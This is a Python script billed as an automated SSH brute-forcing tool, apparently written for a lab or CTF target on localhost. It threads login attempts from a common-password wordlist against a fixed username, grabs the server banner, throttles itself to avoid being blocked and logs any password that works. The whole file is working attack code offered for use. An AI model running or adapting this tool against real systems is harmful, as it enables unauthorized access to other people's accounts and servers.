#Automated SSH Brute Forcing Tool
import paramiko
from pwn import *
import socket
import threading
import time
import re

host = "127.0.0.1"
username = "notroot"
attempts = 0
lock = threading.Lock()
failed_attempts = 0
max_retries = 3

# Function to attempt SSH login
def try_password(password):
    global attempts, failed_attempts
    password = password.strip()
    
    # Password Complexity Check
    if not is_password_complex(password):
        with lock:
            print(f"[{attempts}] Skipping weak password: '{password}'")
        return

    with lock:
        print(f"[{attempts}] Attempting Password: '{password}'")
        attempts += 1
    
    try:
        # Using context manager for SSH connection
        with ssh(host=host, user=username, password=password, timeout=1) as response:
            if response.connected():
                with lock:
                    print(f"[>] Valid Password Found: '{password}'!")
                # Log successful attempt
                with open("successful_login.log", "a") as log_file:
                    log_file.write(f"Valid Password Found: {password}\n")
                response.close()
                return True
    except paramiko.ssh_exception.AuthenticationException:
        with lock:
            print("[X] Invalid Password!")
        failed_attempts += 1
        rate_limit()
    except (paramiko.ssh_exception.SSHException, socket.error) as e:
        with lock:
            print(f"[!] Connection error: {e}")
    
    return False

# Multithreading SSH brute-forcing
def brute_force(passwords):
    threads = []
    for password in passwords:
        thread = threading.Thread(target=try_password, args=(password,))
        thread.start()
        threads.append(thread)
        time.sleep(0.1)  # Small delay to avoid overwhelming server

    for thread in threads:
        thread.join()

# Rate limiting to prevent server blocking after multiple failed attempts
def rate_limit():
    global failed_attempts
    if failed_attempts >= max_retries:
        sleep_time = failed_attempts * 5  # Exponential backoff
        print(f"[!] Rate limiting: Sleeping for {sleep_time} seconds...")
        time.sleep(sleep_time)
        failed_attempts = 0

# Password Complexity Check: Length >= 8, contains digits, uppercase, and special characters
def is_password_complex(password):
    length_check = len(password) >= 8
    digit_check = re.search(r'\d', password)
    upper_check = re.search(r'[A-Z]', password)
    special_char_check = re.search(r'[@$!%*?&#]', password)

    return all([length_check, digit_check, upper_check, special_char_check])

# Banner Grabbing
def grab_banner(host):
    try:
        transport = paramiko.Transport((host, 22))
        transport.connect()
        banner = transport.get_banner()
        print(f"[INFO] SSH Banner: {banner}")
        transport.close()
    except Exception as e:
        print(f"[!] Error grabbing banner: {e}")

# Main code
if __name__ == "__main__":
    # Grab SSH banner first
    grab_banner(host)
    
    # Read password list and start brute force
    with open("ssh-common-passwords.txt", "r") as password_list:
        passwords = password_list.readlines()
        brute_force(passwords)

